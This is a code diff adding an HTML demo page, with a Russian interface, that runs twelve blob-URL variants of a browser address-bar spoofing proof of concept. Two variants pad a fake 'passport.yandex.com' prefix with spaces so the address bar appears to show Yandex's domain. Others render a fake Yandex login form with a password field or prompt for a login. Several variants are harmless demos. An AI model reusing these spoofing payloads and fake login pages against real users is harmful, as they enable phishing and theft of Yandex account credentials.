@@ -1,4 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Exp and createObjectURL Examples</title>
+    <style>
+        button { margin-bottom: 8px; }
+        pre { background: #f5f5f5; padding: 7px;}
+    </style>
+</head>
+<body>
+    <h2>Примеры запуска скрипта по кнопке:</h2>
+
+    <button onclick="runExp(0)">Вариант 1 (ваш оригинал)</button>
+    <button onclick="runExp(1)">Вариант 2 (alert)</button>
+    <button onclick="runExp(2)">Вариант 3 (document.write)</button>
+    <button onclick="runExp(3)">Вариант 4 (open link)</button>
+    <button onclick="runExp(4)">Вариант 5 (background-color)</button>
+    <button onclick="runExp(5)">Вариант 6 (iframe injection)</button>
+    <button onclick="runExp(6)">Вариант 7 (custom protocol in URL)</button>
+    <button onclick="runExp(7)">Вариант 8 (fake login form)</button>
+    <button onclick="runExp(8)">Вариант 9 (auto close)</button>
+    <button onclick="runExp(9)">Вариант 10 (javascript prompt)</button>
+    <button onclick="runExp(10)">Вариант 11 (animated title)</button>
+    <button onclick="runExp(11)">Вариант 12(o)</button>
+
+    <p>Код приведённых вариантов:</p>
+    <pre id="code"></pre>
+
 <script>
-var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","b:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
-location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+// Сами варианты:
+const variants = [
+`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","b:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
+
+`var exp = "<html><body><h1>ALERT TEST</h1><script>alert('Это вариант 2!');<\/script></body></html>";\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = "<html><body><script>document.write('<h2>Документ обновлён скриптом 3</h2>');<\/script></body></html>";\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><body><a id="a" href="https://passport.yandex.com" target="_blank">Кликните для перехода!</a><script>document.getElementById("a").click();<\/script></body></html>';\nlocation=URL.createObjectURL(new Blob([exp], {type:"text/html"}));`,
+
+`var exp = '<html><body style="background:#4fc3f7;"><h1>Фон изменён</h1></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><iframe src="https://yandex.com" width="100%" height="500"></iframe></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = 'Fake page <script>history.replaceState("","","javascript:fakedata")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><body><h2>Login to Yandex</h2><form><input placeholder="login"><br><input type="password" placeholder="password"><br><button>Войти</button></form></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><script>setTimeout(function(){window.close();}, 1500);<\/script><body><h2>Закроется через 1.5сек</h2></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><script>prompt("Введите ваш логин:")<\/script><body><h2>prompt example</h2></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = '<html><script>setInterval(()=>{document.title=Math.random()},500)<\/script><body><h2>Title мигает</h2></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
+
+`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","b:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
+];
+
+// Запуск соответствующего примера:
+function runExp(idx) {
+    // Покажем код для интереса:
+    document.getElementById('code').textContent = variants[idx];
+
+    // Выполним сам JS-код (eval используется только для демонстрации!):
+    eval(variants[idx]);
+}
 </script>
+</body>
+</html>
